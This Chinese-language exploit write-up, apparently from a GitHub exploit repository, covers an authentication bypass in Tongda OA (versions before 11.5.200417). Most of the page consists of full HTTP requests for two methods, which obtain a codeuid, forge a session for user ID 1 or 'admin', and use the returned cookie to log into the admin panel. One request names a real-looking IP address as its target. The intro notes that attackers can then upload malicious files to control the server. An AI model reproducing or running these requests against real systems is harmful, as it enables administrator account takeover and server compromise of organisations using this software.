# 一、漏洞简介
通达OA（Office Anywhere网络智能办公系统）是中国通达公司的一套协同办公自动化软件。通达OA < 11.5.200417存在一个认证绕过漏洞，利用该漏洞可以实现任意用户登录。攻击者可以通过构造恶意攻击代码，成功登录系统管理员账户，继而在系统后台上传恶意文件控制网站服务器。
# 二、影响版本
-  通达OA 2017-通达OA V11.4
# 三、漏洞复现
## 第一种利用方法
**1. 获取code_uid**
get请求获取codeuid
```
/general/login_code.php
/ispirit/login_code.php
```
![image](https://github.com/xiaokp7/GUIEXPDB/assets/105373673/8b231d89-f140-444c-ac1d-0bed22d56480)
![image](https://github.com/xiaokp7/GUIEXPDB/assets/105373673/580c34b8-aeab-452e-b20f-b313ff00ce2f)

**2. 获取cookie**

post请求使用上一步获取的codeuid替换，当响应中status字段为1时代表获取cookie成功

```
POST /logincheck_code.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

CODEUID={546DF670-FBDB-251D-D4AA-CD5C6C976592}&UID=1
```
![image](https://github.com/xiaokp7/GUIEXPDB/assets/105373673/5c800cea-0667-4243-8f07-c16abaa164e0)

**3. 利用获取到的cookie登录系统**

利用上一步获取到的cookie替换，成功登录系统
```
GET /general/index.php?is_modify_pwd=1 HTTP/1.1
Host: xxx.xxx.xxx.xxx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=afni33n5if6hi6s26i3b2h79j3;
Connection: close
```

## 第二种利用方法
**1. 获取codeuid**
```
/ispirit/login_code.php
/ispirit/login_code.php
```
![image](https://github.com/xiaokp7/GUIEXPDB/assets/105373673/64d7f095-98d4-4d47-91db-2aca6453a536)

**2. 验证codeuid**
当响应status为1时，代表验证成功。
```
POST /general/login_code_scan.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 92

codeuid={8E41DD10-C3C3-A664-2249-2A2B2DF23619}&source=pc&uid=1&type=confirm&username=admin
```
![image](https://github.com/xiaokp7/GUIEXPDB/assets/105373673/0e74cb05-1f25-44e6-91dc-d1acd9d7f563)

**3. 获取cookie**
当响应status为1时，代表获取cookie成功
```
/ispirit/login_code_check.php?codeuid={EED2B9FE-F865-DCF1-0E8D-3326AE163F6D}
```
![image](https://github.com/xiaokp7/GUIEXPDB/assets/105373673/b3da5499-96df-4c57-90bc-6d06838535f5)

**4. 利用获取到的cookie登录系统**
```
GET /general/index.php?is_modify_pwd=1 HTTP/1.1
Host: 1.14.47.145:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2l86fav5r9d65gjcub1abh49n1;
Connection: close
```
 ![image](https://github.com/xiaokp7/GUIEXPDB/assets/105373673/d2514f62-2f8a-4bb8-a683-41d74340591c)
# 四、工具利用
<img width="600" alt="image" src="https://github.com/xiaokp7/GUIEXPDB/assets/105373673/9376adfe-e30b-459d-b913-a154fdaa52f1">



